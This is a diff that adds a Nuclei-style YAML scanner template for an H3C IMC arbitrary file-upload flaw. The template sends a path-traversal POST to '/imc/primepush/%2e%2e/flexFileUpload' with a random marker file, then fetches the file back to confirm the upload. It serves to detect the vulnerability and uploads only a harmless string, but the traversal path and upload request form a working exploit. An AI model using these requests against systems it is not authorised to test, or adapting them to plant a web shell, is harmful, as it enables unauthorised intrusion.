@@ -1,0 +1,45 @@
+
+id: h3c-zizhufuwu-upload
+
+info:
+  name: msk-template
+  author: msk
+  severity: high
+
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
+        Connection: close
+        Content-Type: multipart/form-data; boundary=---------------{{boundary}}
+        Accept-Encoding: gzip
+
+        -----------------{{boundary}}
+        Content-Disposition: form-data; name="{{filename}}.txt"; filename="{{filename}}"
+        Content-Type: application/octet-stream
+        Content-Length: 255
+        
+        {{randstr}}
+
+        -----------------{{boundary}}--
+
+
+      - |
+        GET /imc/primepush/%2e%2e/flex/topobg/{{filename}}.txt HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36
+        Connection: close
+        Accept-Encoding: gzip
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"{{randstr}}")
